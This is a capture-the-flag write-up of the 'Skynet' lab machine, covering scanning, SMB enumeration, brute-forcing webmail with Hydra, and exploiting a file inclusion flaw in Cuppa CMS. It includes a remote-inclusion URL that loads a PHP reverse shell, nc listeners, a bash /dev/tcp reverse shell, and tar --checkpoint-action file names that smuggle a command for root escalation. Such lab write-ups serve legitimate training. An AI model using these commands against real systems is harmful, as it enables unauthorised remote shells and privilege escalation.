# Skynet

## Nmap Scan
- Ran scan against target machine
  `nmap -sS -A -O -p- 10.10.137.142`

  ![Nmap Scan Results](screenshots/2022-09-04-12-34-35.png)

- Ran DirBuster to find directories

    ![DirBuster Results](screenshots/2022-09-04-12-35-30.png)

- Ran `smbmap` to find smb shares

    ![smbmap results](screenshots/2022-09-04-12-46-32.png)

- Found the `anonymous` share with READ ONLY access - attempt to connect to it

    ![SMB share connect](screenshots/2022-09-04-12-47-40.png)

- Download a copy of the found `.txt` files 

    ![Getting a copy of txt files](screenshots/2022-09-04-12-49-36.png)

- The `log1.txt` has what looks like a list of password. With this we can use BurpSuite to capture requests and hydra to brute force the site.

    ![Burp Suite Request Capture](screenshots/2022-09-04-13-04-08.png)

- Use Hydra to attempt to Brute Force

    ![Hydra Brute Force](screenshots/2022-09-04-13-15-58.png)

- From this we get the login and are able to login to the user `milesdyson` webmail. 
- Found an email that contains a password for a samba share, use that to login to the `milesdyson` samba share

- Found a file named `important.txt` and got a copy of that 
- From that we get a hidden directory, used `DirBuster` against this to find this admin page

    ![CMS Admin page](screenshots/2022-09-04-13-26-59.png)

- Search for a cuppa vulnerability using `searchsploit`

    ![Searchsploit Results](screenshots/2022-09-04-13-31-24.png)

- Used the exploit against the target and was able to get the `/etc/passwd` file

    ![/etc/passwd file](screenshots/2022-09-04-13-32-02.png)

- This shows that we can perform Local File Inclusion. Pulled this attack off by following these steps:
  1. Grabbed a `php-reverse-shell.php` from [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
  2. Made appropriate changes to IP and Port information
  3. Made this available using `python -m http.server`
  4. Started a listener using `nc -nlvp 4445`
  5. Adapted the exploit URL to my scenario (http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?)
  6. Looked for the flags

    ![Shell](screenshots/2022-09-04-14-00-36.png)

- Followed these steps to get a root shell - create a listener using `nc -nlvp 6666`

```
$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.50.72/6666 0>&1' > /var/www/html/shell
$ chmod +x /var/www/html/shell
$ touch /var/www/html/--checkpoint=1
$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
```